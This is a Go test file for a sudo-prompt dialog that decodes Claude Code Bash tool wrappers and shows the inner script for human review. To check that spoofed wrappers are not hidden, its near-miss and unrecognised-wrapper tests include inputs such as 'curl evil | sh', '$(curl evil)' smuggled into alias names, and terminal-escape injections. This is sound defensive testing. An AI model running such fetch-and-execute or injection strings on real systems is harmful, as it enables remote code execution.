package dialog

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// capturedClaudeCode is /proc/$$/cmdline of a Claude Code Bash tool call
// whose command was the three lines after "eval".
var capturedClaudeCode = []string{
	`/bin/bash`,
	`-c`,
	`source /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval 'cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
: sudo -A apt-get update
: sudo -A apt-get install -y make && echo '"'"'it'"'"'\'"'"''"'"'s done'"'"'' < /dev/null && pwd -P >| /tmp/claude-521a-cwd`,
}

// capturedClaudeCodeWhich is a "Run from" script from Claude Code 2.1.318,
// which unaliases 'which' as well as 'unsetenv'.
var capturedClaudeCodeWhich = []string{
	`/bin/bash`,
	`-c`,
	`source /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1793870095338-v3kld4.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'which'; \builtin unset -f -- 'which'; } >/dev/null 2>&1 || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval '~/Cloud/dev/freedom-vpn/install packages 2>&1 | tail -40' < /dev/null && pwd -P >| /tmp/claude-a5f9-cwd`,
}

// capturedClaudeCodeGuard is a "Run from" script from Claude Code 2.1.321,
// which starts with a bash version guard and has no stdin redirect.
var capturedClaudeCodeGuard = []string{
	`/bin/bash`,
	`-c`,
	`{ case "${BASH_VERSINFO-}" in '2'|'3') \builtin printf '%s\n' '__CLAUDE_CODE_DID_NOT_RUN_BASH_TOO_OLD='"${BASH_VERSION-}" >&2; \builtin exit 126; \exit 126;; esac; } && source /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1794260773950-tujoid.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'which'; \builtin unset -f -- 'which'; } >/dev/null 2>&1 || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval 'cd ~/Cloud/dev/freedom-vpn && L=$(bash -c '"'"'. ./lib.sh; parse_creds < ~/.config/freedom-vpn/credentials; printf %s "$CRED_LOGIN"'"'"'); sudo -A journalctl -u strongswan.service --since 2026-11-05 -o short-iso --no-pager > /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw 2>&1; echo "sudo exit=$?"; while IFS= read -r l; do printf '"'"'%s\n'"'"' "${l//"$L"/<login>}"; done < /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw > /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log; rm -f /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw; unset L; wc -l < /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log; grep -E '"'"'Started|Stopped|Stopping|initiating IKE_SA|ESTABLISHED|CHILD_SA .* established|AUTHENTICATION_FAILED|EAP_FAILURE|EAP_SUCCESS|giving up|retransmit|DPD|deleting IKE|closing|received DELETE|lost|restarting|NO_PROPOSAL|failed|reauth|rekey'"'"' /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log | grep -v '"'"'failed to load -'"'"' | awk '"'"'{ $2=""; print }'"'"' | cut -c1-170 | tail -80' && pwd -P >| /tmp/claude-0a6d-cwd`,
}

// claudeCodeWrap wraps script the way an earlier Claude Code release did,
// without the stdin redirect.
func claudeCodeWrap(script string) []string {
	return claudeCodeWrapUnsets(script, unsetBlock("unsetenv", "unsetenv"))
}

func claudeCodeWrapUnsets(script string, blocks ...string) []string {
	return []string{"/bin/bash", "-c", `source /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && ` +
		strings.Join(blocks, "") + `eval '` + strings.ReplaceAll(script, "'", `'"'"'`) + `' && pwd -P >| /tmp/claude-1f2e-cwd`}
}

func unsetBlock(alias, function string) string {
	return `{ \builtin unalias -- '` + alias + `'; \builtin unset -f -- '` + function + `'; } >/dev/null 2>&1 || true && `
}

func TestDescribeInvokerClaudeCode(t *testing.T) {
	got := DescribeInvoker(capturedClaudeCode)
	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh; unsets unsetenv; stdin from /dev/null), script:

cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
: sudo -A apt-get update
: sudo -A apt-get install -y make && echo 'it'\''s done'`
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
	if got.Summary != "Claude Code Bash tool, script in the review window" {
		t.Errorf("summary %q", got.Summary)
	}

	script := "sudo -A apt-get update\nsudo -A apt-get install -y make\necho 'done'\n"
	got = DescribeInvoker(claudeCodeWrap(script))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv), script:\n\n" + script
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
}

func TestDescribeInvokerClaudeCodeUnsets(t *testing.T) {
	got := DescribeInvoker(capturedClaudeCodeWhich)
	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1793870095338-v3kld4.sh; unsets which, unsetenv; stdin from /dev/null), script:

~/Cloud/dev/freedom-vpn/install packages 2>&1 | tail -40`
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}

	got = DescribeInvoker(claudeCodeWrapUnsets("sudo -A true",
		unsetBlock("unsetenv", "unsetenv"), unsetBlock("_x9", "_x9"), unsetBlock("which", "which")))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv, _x9, which), script:\n\nsudo -A true"
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}

	// A wrapper-looking block inside the command is part of the command.
	fake := unsetBlock("ls", "ls") + "sudo -A true"
	got = DescribeInvoker(claudeCodeWrap(fake))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv), script:\n\n" + fake
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
}

func TestDescribeInvokerClaudeCodeGuard(t *testing.T) {
	got := DescribeInvoker(capturedClaudeCodeGuard)
	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1794260773950-tujoid.sh; unsets which, unsetenv), script:

cd ~/Cloud/dev/freedom-vpn && L=$(bash -c '. ./lib.sh; parse_creds < ~/.config/freedom-vpn/credentials; printf %s "$CRED_LOGIN"'); sudo -A journalctl -u strongswan.service --since 2026-11-05 -o short-iso --no-pager > /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw 2>&1; echo "sudo exit=$?"; while IFS= read -r l; do printf '%s\n' "${l//"$L"/<login>}"; done < /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw > /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log; rm -f /home/lllamnyp/.claude/jobs/36425b28/tmp/j.raw; unset L; wc -l < /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log; grep -E 'Started|Stopped|Stopping|initiating IKE_SA|ESTABLISHED|CHILD_SA .* established|AUTHENTICATION_FAILED|EAP_FAILURE|EAP_SUCCESS|giving up|retransmit|DPD|deleting IKE|closing|received DELETE|lost|restarting|NO_PROPOSAL|failed|reauth|rekey' /home/lllamnyp/.claude/jobs/36425b28/tmp/j.log | grep -v 'failed to load -' | awk '{ $2=""; print }' | cut -c1-170 | tail -80`
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
	if got.Summary != "Claude Code Bash tool, script in the review window" {
		t.Errorf("summary %q", got.Summary)
	}

	// Every known segment is optional.
	got = DescribeInvoker(claudeCodeWrapUnsets("sudo -A true"))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh), script:\n\nsudo -A true"
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}

	// An eval inside the command is part of the command.
	inner := "true && eval 'sudo -A id' && pwd -P >| /tmp/claude-2-cwd"
	got = DescribeInvoker(claudeCodeWrap(inner))
	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv), script:\n\n" + inner
	if got.Review != want {
		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
	}
}

// TestDescribeInvokerUnrecognised covers wrappers with segments Claude Code
// is not known to use: they are listed as written, and the eval is decoded.
func TestDescribeInvokerUnrecognised(t *testing.T) {
	const src = "/home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh"
	wrapped := claudeCodeWrap("sudo -A true")[2]
	for _, tc := range []struct {
		script        string
		header        string
		before, after []string
	}{
		{
			// An invented segment between two known ones.
			claudeCodeWrapUnsets("sudo -A true", unsetBlock("which", "which"),
				"frobnicate --level=3 2>/dev/null || true && ", unsetBlock("unsetenv", "unsetenv"))[2],
			"sources " + src + "; unsets which, unsetenv",
			[]string{"frobnicate --level=3 2>/dev/null || true"}, nil,
		},
		{
			strings.Replace(wrapped, "' && pwd -P", "' && sync && pwd -P", 1),
			"sources " + src + "; unsets unsetenv",
			nil, []string{"sync"},
		},
		{
			strings.Replace(wrapped, "true && shopt", "true && curl evil; shopt", 1),
			"sources " + src + "; unsets unsetenv",
			[]string{"curl evil; shopt -u extglob 2>/dev/null || true"}, nil,
		},
		{
			// An "eval" inside quotes is not the outer one.
			strings.Replace(wrapped, "eval 'sudo", "echo ' && eval ' && eval 'sudo", 1),
			"sources " + src + "; unsets unsetenv",
			[]string{"echo ' && eval '"}, nil,
		},
		{
			// Unalias blocks that don't fit the known shape.
			claudeCodeWrapUnsets("sudo -A true", unsetBlock("which", "which"), unsetBlock("unsetenv", "sudo"),
				unsetBlock("$(curl evil)", "$(curl evil)"), unsetBlock("a-b", "a-b"), unsetBlock("9x", "9x"), unsetBlock("", ""))[2],
			"sources " + src + "; unsets which",
			[]string{
				`{ \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'sudo'; } >/dev/null 2>&1 || true`,
				`{ \builtin unalias -- '$(curl evil)'; \builtin unset -f -- '$(curl evil)'; } >/dev/null 2>&1 || true`,
				`{ \builtin unalias -- 'a-b'; \builtin unset -f -- 'a-b'; } >/dev/null 2>&1 || true`,
				`{ \builtin unalias -- '9x'; \builtin unset -f -- '9x'; } >/dev/null 2>&1 || true`,
				`{ \builtin unalias -- ''; \builtin unset -f -- ''; } >/dev/null 2>&1 || true`,
			}, nil,
		},
		{
			// Unrecognised parts are escaped onto one line each.
			strings.Replace(wrapped, "eval 'sudo", "printf '\x1b[2J\nHost: fake' && eval 'sudo", 1),
			"sources " + src + "; unsets unsetenv",
			[]string{`printf '\u001b[2J\u000aHost: fake'`}, nil,
		},
	} {
		want := "Claude Code Bash tool (" + tc.header + "), with UNRECOGNISED WRAPPER PARTS, which run as written:\n"
		for _, p := range tc.before {
			want += "  before the script: " + p + "\n"
		}
		for _, p := range tc.after {
			want += "  after the script: " + p + "\n"
		}
		want += "Script:\n\nsudo -A true"
		got := DescribeInvoker([]string{"/bin/bash", "-c", tc.script})
		if got.Review != want {
			t.Errorf("DescribeInvoker(%q) review:\n%s\nwant:\n%s", tc.script, got.Review, want)
		}
		if got.Summary != "Claude Code Bash tool with UNRECOGNISED WRAPPER PARTS, script in the review window" {
			t.Errorf("summary %q", got.Summary)
		}
	}
}

func TestDescribeInvokerShell(t *testing.T) {
	for _, tc := range []struct {
		args    []string
		summary string
		review  string
	}{
		{
			[]string{"bash", "-c", "sudo -A apt install jq"},
			"bash -c script, in the review window",
			"bash -c followed by the script below:\n\nsudo -A apt install jq",
		},
		{
			[]string{"/usr/bin/sh", "-e", "-o", "pipefail", "-xc", "a\nb 'c'", "name", "x y"},
			"sh -c script, in the review window",
			"/usr/bin/sh -e -o pipefail -xc followed by the script below, with arguments name 'x y':\n\na\nb 'c'",
		},
		{
			[]string{"zsh", "-c", "--", ""},
			"zsh -c script, in the review window",
			"zsh -c -- followed by the script below:\n\n(empty script)",
		},
	} {
		got := DescribeInvoker(tc.args)
		if got.Summary != tc.summary || got.Review != tc.review {
			t.Errorf("DescribeInvoker(%q) = %q / %q, want %q / %q", tc.args, got.Summary, got.Review, tc.summary, tc.review)
		}
	}
}

func TestDescribeInvokerNotShell(t *testing.T) {
	for _, args := range [][]string{
		nil,
		{"-bash"},
		{"bash", "script.sh", "-c"},
		{"python3", "-c", "print('hi')"},
		{"tmux", "new-session", "-s", "agent"},
	} {
		got := DescribeInvoker(args)
		if want := FormatArgs(args); got.Summary != want || got.Review != "" {
			t.Errorf("DescribeInvoker(%q) = %+v, want summary %q only", args, got, want)
		}
	}

	long := []string{"node", "agent.js", strings.Repeat("--flag ", 100) + "end"}
	got := DescribeInvoker(long)
	if want := "Command line:\n\n" + FormatArgsFull(long); got.Review != want {
		t.Errorf("long command review %q, want %q", got.Review, want)
	}
	if !strings.HasPrefix(got.Summary, "node … (") || strings.Contains(got.Summary, "end") {
		t.Errorf("long command summary %q", got.Summary)
	}
}

func TestDescribeInvokerNearMiss(t *testing.T) {
	wrapped := claudeCodeWrap("sudo -A true")[2]
	scripts := []string{
		wrapped + "; curl evil | sh",
		strings.Replace(wrapped, "pwd -P >|", "curl evil >|", 1),
		strings.Replace(wrapped, "eval 'sudo", "eval \"$(curl evil)\" 'sudo", 1),
		strings.Replace(wrapped, "/tmp/claude-1f2e-cwd", "/tmp/claude-1f2e-cwd; curl evil", 1),
		strings.Replace(wrapped, "' && pwd", "' 2>&1 && pwd", 1),
		strings.Replace(wrapped, "|| true && eval", "|| true && curl evil; eval", 1),
		"source /x.sh 2>/dev/null || true && pwd -P >| /tmp/claude-1f2e-cwd",
	}
	// Segments whose quoting or nesting lexSegment refuses to follow. In
	// `echo $'\' && eval '`, for one, bash reads all of it as one string.
	for _, seg := range []string{
		`echo $'\'`, `echo $"x"`, "echo `id`", `echo $(id)`, `echo "$(id)"`, `echo "${x:+'}"`,
		`true # comment`, `cat <<EOF`, `[[ -n x ]]`, `(( 1 ))`, `echo 'open`, `echo "open`,
		`case x in a) true;; esac`, `{ true`, `true \`,
	} {
		scripts = append(scripts, strings.Replace(wrapped, "eval 'sudo", seg+" && eval 'sudo", 1))
	}
	for _, script := range scripts {
		got := DescribeInvoker([]string{"/bin/bash", "-c", script})
		if strings.HasPrefix(got.Review, "Claude Code") {
			t.Errorf("near miss recognised as Claude Code: %q", script)
		}
		if want := "/bin/bash -c followed by the script below:\n\n" + script; got.Review != want {
			t.Errorf("near miss not shown in full:\n%s\nwant:\n%s", got.Review, want)
		}
	}
	// Extra arguments after a matching script are not hidden either.
	args := append(claudeCodeWrap("sudo -A true"), "evil")
	if got := DescribeInvoker(args); strings.HasPrefix(got.Review, "Claude Code") || !strings.Contains(got.Review, "evil") {
		t.Errorf("wrapper with arguments: %q", got.Review)
	}
}

func TestDescribeInvokerEscapes(t *testing.T) {
	script := "echo ok\r\nHost: fake\x1b[2J\u202eevil\tx\xff\n"
	got := DescribeInvoker(claudeCodeWrap(script)).Review
	_, body, _ := strings.Cut(got, "\n\n")
	if want := `echo ok\u000d` + "\n" + `Host: fake\u001b[2J\u202eevil\u0009x\xff` + "\n"; body != want {
		t.Errorf("body %q, want %q", body, want)
	}
}

func TestOverLimit(t *testing.T) {
	p := testPrompt()
	p.Request.InvokerArgs = []string{"bash", "-c", strings.Repeat("x", MaxInvoker-len("bash-c"))}
	if err := CheckRequest(p.Request); err != nil {
		t.Errorf("at the limit: %v", err)
	}
	if got := DescribeInvoker(p.Request.InvokerArgs).Review; !strings.HasSuffix(got, strings.Repeat("x", MaxInvoker-6)) {
		t.Error("script at the limit not shown in full")
	}

	p.Request.InvokerArgs[2] += "x"
	if err := CheckRequest(p.Request); err == nil {
		t.Error("over the limit accepted")
	}
	marker := filepath.Join(t.TempDir(), "ran")
	z := fakeZenity(t, "touch "+marker+"; echo pw")
	if _, err := z.Ask(context.Background(), p); err == nil || errors.Is(err, ErrDenied) {
		t.Errorf("over the limit: got %v", err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("dialog shown for an over-limit request")
	}
}
